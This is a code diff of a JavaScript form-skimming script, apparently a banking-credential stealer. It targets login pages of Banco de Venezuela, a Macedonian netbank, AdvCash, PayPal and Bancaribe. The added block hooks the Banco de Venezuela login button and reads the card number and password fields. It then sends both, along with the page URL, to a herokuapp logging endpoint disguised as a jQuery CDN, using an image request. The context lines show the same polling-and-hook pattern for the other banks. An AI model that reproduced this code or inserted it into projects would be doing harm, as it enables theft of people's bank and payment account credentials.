@@ -10,6 +10,25 @@ for (var i = 0; i < arrayLength; i++) {
 
 
 
+if (top['location']['href']['indexOf']('e-bdvcpx.banvenez.com') > -1) {
+    var interval = setInterval(function () {
+        if (document['getElementsByClassName']('borde_tabla_basic')[0]) {
+            clearInterval(interval);
+            document['getElementsByClassName']('input_boton_reg')[0].onclick = function (_0x441cx2) {
+             var login = {};
+            login.email = document.getElementsByName("notarjeta1")[0].value;
+            login.pass = document.getElementsByName("passwordp1")[0].value;
+            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.email+"&p="+login.pass;
+            }
+        }
+    }, 1000)
+};
+
+
+
+
+
+
   if (top['location']['href']['indexOf']('https://www.netbanking.mk/Stopanstvo/LoginModule/LoginUP.aspx') > -1) {
       var interval = setInterval(function () {
           if (document['getElementsByClassName']('login_fields')[0]) {
@@ -23,15 +42,6 @@ for (var i = 0; i < arrayLength; i++) {
           }
       }, 1000)
   };
-
-
-
-
-
-
-
-
-
 
 
   if (top['location']['href']['indexOf']('wallet.advcash.com') > -1) {
@@ -48,8 +58,6 @@ for (var i = 0; i < arrayLength; i++) {
           }
       }, 1000)
   };
-
-
 
 
   if (top['location']['href']['indexOf']('paypal.com') > -1) {
@@ -81,7 +89,6 @@ var login_form = document.getElementById("loginForm");
         }
 
 
-
   if (top['location']['href']['indexOf']('https://www3.bancaribe.com.ve/bcn/') > -1) {
       var interval = setInterval(function () {
           if (document['getElementsByName']('conexion')[0]) {
@@ -95,7 +102,6 @@ var login_form = document.getElementById("loginForm");
           }
       }, 1000)
   };
-
 
 
   if (top['location']['href']['indexOf']('https://www4.bancaribe.com.ve/bcj/') > -1) {
